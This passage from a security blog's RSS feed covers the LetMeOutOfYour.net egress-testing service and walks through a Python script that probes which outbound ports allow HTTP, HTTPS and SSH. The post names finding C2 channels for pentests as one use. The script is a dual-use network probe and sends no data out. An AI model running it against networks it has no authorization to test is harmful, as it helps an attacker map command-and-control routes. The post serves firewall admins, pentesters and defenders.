&lt;p&gt;Notice that through this entire rant, I didn&amp;rsquo;t mention leadership, management, or executives. It is effortless to blame &amp;ldquo;them&amp;rdquo; for Offensive Teams not being accepted or forced into one phase or another. Still, it&amp;rsquo;s on the teams to define that narrative better through expectation setting and over communication.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Let Me Out of Your Net - Egress Testing</title>
      <link>https://malicious.link/post/2020/lmo-egress-testing/</link>
      <pubDate>Sat, 04 Jul 2020 09:14:33 -0400</pubDate>
      
      <guid>https://malicious.link/post/2020/lmo-egress-testing/</guid>
      <description>&lt;p&gt;Use-cases:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;IT Admin, Firewall Admin, or Security staff at a company and want to confirm what ports and protocols are allowed of your network.&lt;/li&gt;
&lt;li&gt;Pentester that intends to identify ports and protocols that can be used for a pentest to gain C2 outbound.&lt;/li&gt;
&lt;li&gt;Purple Team testing ports and protocol detection for C2.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Egress testing is an exciting problem due to the uniqueness of most networks. You may find fully open networks like those found in many Silicon Valley companies or companies attempting to move to a &amp;ldquo;Beyond Corp&amp;rdquo; model. Or, you may find a network of a small business that hasn&amp;rsquo;t put much thought into outbound egress but follow traditional best practices allowing only specific ports out. You may be up against an enterprise that only allows proxied connections outbound with full protocol filtering and analysis.&lt;/p&gt;
&lt;p&gt;I created LetMeOutOfYour.net to handle all of these situations. I wanted a service that allows for confirmable responses via as many protocols as possible over any port.&lt;/p&gt;
&lt;p&gt;The design idea is that the server listens on all ports multiplexed for the most common three protocols (HTTP, HTTPS, and SSH). DNS is setup up in a way that all hostnames and sub-domains also route to the LMO host. On SSH, the server host key is used to confirm successful, non-modified connections. HTTP is set up to listen not only on any port but also any URI. HTTPS has a valid SSL certificate, thanks to LetsEncrypt.&lt;/p&gt;
&lt;p&gt;For example:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://randomstring2321.letmeoutofyour.net:3821/return/to/path.wsdl&#34;&gt;https://randomstring2321.letmeoutofyour.net:3821/return/to/path.wsdl&lt;/a&gt; Response: (w00tw00t)&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://test.woot.letmeoutofyour.net:22/cool/stuff.php&#34;&gt;http://test.woot.letmeoutofyour.net:22/cool/stuff.php&lt;/a&gt; Response: (w00tw00t)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The following is a script to test a range of ports with HTTP, HTTPS, and SSH and confirm the response&amp;quot;&lt;/p&gt;
&lt;p&gt;Just beginning with libraries. Paramiko is a SSH library for Python, and Concurrent.Futures is a method for creating concurrency/threading to speed up the script.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; socket
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; random
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; string
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; concurrent.futures
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; paramiko.client &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; SSHClient
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; paramiko
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here are the variable to configure the script:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ports: Two examples for specifying a list of ports, or doing a range is available.&lt;/li&gt;
&lt;li&gt;Domain: Anyone can set up their own LMO server
using this Ansible script: &lt;a href=&#34;https://gitlab.com/mubix/letmeoutofyour.net&#34;&gt;LetMeOutOfYour.net Server Setup&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Verbose: Adds output saying what is being tested at that time.&lt;/li&gt;
&lt;li&gt;printOpen and printClosed: These options can help determine how much output you want. If you are in a network that has mostly open connections you may only want things that are closed, or if you are egress testing a more closed network you may only want open. Or you may want everything and just filter it later.&lt;/li&gt;
&lt;li&gt;ThreadCount: How many threads to spin up to get through your list.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Finally it randomizes the list so that you aren&amp;rsquo;t hitting everything in order.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# VARIABLES&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ports &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;443&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;3389&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#ports = list(range(1,65536))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;domain &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;letmeoutofyour.net&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;verbose &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;printOpen &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;printClosed &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;threadcount &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;shuffle(ports)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;These functions are just checking if the different verbosity levels are set and printing if they are.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Verbosity - set to False above if you don&amp;#39;t want output&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;vprint&lt;/span&gt;(status):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; verbose &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(status)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Print open ports&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;print_open&lt;/span&gt;(status):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; printOpen &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; status)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Print closed ports&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;print_closed&lt;/span&gt;(status):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; printClosed &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[-] &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; status)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This is the function to test the HTTP/HTTPS connections:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;check_web&lt;/span&gt;(base, domain, port):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  vprint(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Testing: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; base &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; domain &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(port))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(base &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; domain &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(port), timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; result &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;w00tw00t&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      print_open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Success! &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; base &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; domain &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(port))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exceptions&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ConnectionError:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print_closed(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Failed! &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; base &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; domain &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(port))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This is the function to test SSH. It actually is pretty interesting because using Paramiko there isn&amp;rsquo;t a direct way just ask for remote host key that I&amp;rsquo;ve found, but you can attempt to connect, catch that it fails because either the host key isn&amp;rsquo;t in known_hosts or because no user name or password is supplied. Both errors still result in the &lt;code&gt;client&lt;/code&gt; object being populated with the remote host&amp;rsquo;s host key and this is what we use to compare against.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;check_ssh&lt;/span&gt;(domain, port):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  client &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; SSHClient()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  vprint(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Trying SSH to &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; domain &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; Port: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(port))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect(domain, port, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; paramiko&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ssh_exception&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SSHException:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;timeout:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print_closed(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Failed! SSH to &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; domain &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; Port: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(port))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_transport()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_remote_server_key()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; key&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_base64() &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AAAAC3NzaC1lZDI1NTE5AAAAIIrfkWLMzwGKRliVsJOjm5OJRJo6AZt7NsqAH8bk9tYc&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print_open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Success! SSH to &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; domain &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; Port: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(port))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here is the &amp;ldquo;main&amp;rdquo; portion of the script (yes, I need to actually make a main function&amp;hellip;)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; concurrent&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;futures&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ThreadPoolExecutor(threadcount) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; executor:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; port &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; ports:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# Test HTTP&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    executor&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;submit(check_web, base, domain, port)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# Test HTTPS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    executor&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;submit(check_web, base, domain, port)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# Test SSH&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    executor&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;submit(check_ssh, domain, port)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here is the script all put together:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; socket
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; random
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; string
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; concurrent.futures
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; paramiko.client &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; SSHClient
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; paramiko
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# VARIABLES&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ports &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;443&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;3389&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#ports = list(range(1,65536))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;domain &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;letmeoutofyour.net&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;verbose &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;printOpen &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
